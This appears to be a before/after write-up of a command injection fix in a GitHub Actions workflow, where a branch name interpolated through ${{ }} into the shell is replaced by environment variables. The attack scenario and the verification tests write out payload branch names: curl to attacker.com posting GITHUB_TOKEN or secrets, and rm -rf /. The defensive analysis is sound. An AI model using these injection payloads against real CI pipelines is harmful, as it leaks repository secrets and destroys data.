COMMAND INJECTION FIX - BEFORE/AFTER COMPARISON
================================================

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
BEFORE (VULNERABLE) - Line 112
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

TARGET_BRANCH="${{ github.head_ref || github.ref_name }}"
if [ -z "$TARGET_BRANCH" ]; then
  echo "âŒ Cannot determine target branch for push"
  exit 1
fi
git push origin HEAD:"$TARGET_BRANCH"

VULNERABILITY:
  - GitHub Actions expression ${{ }} interpolated into shell
  - Shell re-evaluates string, executes command substitution
  - Attacker-controlled branch name can inject arbitrary commands

ATTACK SCENARIO:
  Branch: feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")

  Expansion:
    TARGET_BRANCH="feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")"

  Execution:
    Shell executes: curl https://attacker.com -d "$GITHUB_TOKEN"
    Result: GITHUB_TOKEN leaked to attacker

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
AFTER (SECURE) - Line 112
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
if [ -z "$TARGET_BRANCH" ]; then
  echo "âŒ Cannot determine target branch for push"
  exit 1
fi
git push origin HEAD:"$TARGET_BRANCH"

SECURITY:
  - Reads pre-populated environment variables
  - No shell re-evaluation or re-parsing
  - Command substitution treated as literal string
  - Safe for all branch names (including malicious)

ATTACK SCENARIO (SAME BRANCH):
  Branch: feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")

  Environment:
    GITHUB_HEAD_REF="feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")"

  Expansion:
    TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
    TARGET_BRANCH="feature/$(curl https://attacker.com -d "$GITHUB_TOKEN")"

  Execution:
    None. $(...) is literal string, not executed.
    Result: Branch name used as-is, no command injection

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
CHANGE SUMMARY
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

-TARGET_BRANCH="${{ github.head_ref || github.ref_name }}"
+TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"

EXPLANATION:
  - ${{ }} â†’ Shell environment variable
  - github.head_ref â†’ GITHUB_HEAD_REF (pre-populated)
  - github.ref_name â†’ GITHUB_REF_NAME (pre-populated)
  - || â†’ :- (bash parameter expansion fallback)

BASH PARAMETER EXPANSION:
  ${VAR:-default}
    - If VAR is set and non-empty, use its value
    - Otherwise, use default value
    - Reads from environment, no command substitution

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
SECURITY VERIFICATION
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Test 1: Malicious Branch (Command Injection Attempt)
  export GITHUB_HEAD_REF='feature/$(rm -rf /)'
  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
  echo "$TARGET_BRANCH"
  # Output: feature/$(rm -rf /)
  # Result: âœ… No execution, literal string

Test 2: Malicious Branch (Data Exfiltration Attempt)
  export GITHUB_HEAD_REF='feature/$(curl attacker.com -d "$SECRET")'
  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
  echo "$TARGET_BRANCH"
  # Output: feature/$(curl attacker.com -d "$SECRET")
  # Result: âœ… No execution, secret not leaked

Test 3: Nested Command Substitution
  export GITHUB_HEAD_REF='feature/$(whoami)/$(pwd)'
  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
  echo "$TARGET_BRANCH"
  # Output: feature/$(whoami)/$(pwd)
  # Result: âœ… No execution, both substitutions literal

Test 4: Fallback to GITHUB_REF_NAME
  unset GITHUB_HEAD_REF
  export GITHUB_REF_NAME='main'
  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
  echo "$TARGET_BRANCH"
  # Output: main
  # Result: âœ… Fallback works correctly

Test 5: Both Empty (Edge Case)
  unset GITHUB_HEAD_REF
  unset GITHUB_REF_NAME
  TARGET_BRANCH="${GITHUB_HEAD_REF:-$GITHUB_REF_NAME}"
  if [ -z "$TARGET_BRANCH" ]; then
    echo "Error: Cannot determine target branch"
    exit 1
  fi
  # Output: Error: Cannot determine target branch
  # Exit: 1
  # Result: âœ… Graceful failure with guard

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
IMPACT ANALYSIS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

BEFORE (Vulnerable):
  Risk: ğŸ”´ CRITICAL
  - Remote Code Execution (RCE) possible
  - Secret exfiltration possible
  - Repository compromise possible
  - Supply chain attack vector

AFTER (Secure):
  Risk: ğŸŸ¢ NEGLIGIBLE
  - No command execution possible
  - Secrets safe
  - Repository safe
  - No attack vector

FUNCTIONAL IMPACT:
  âœ… No change in workflow behavior
  âœ… All scenarios work identically
  âœ… Backward compatible
  âœ… Production-ready

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
FINAL STATUS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âœ… Command injection vulnerability ELIMINATED
âœ… Secure for all branch names
âœ… Maintains workflow functionality
âœ… No regressions
âœ… Production-ready
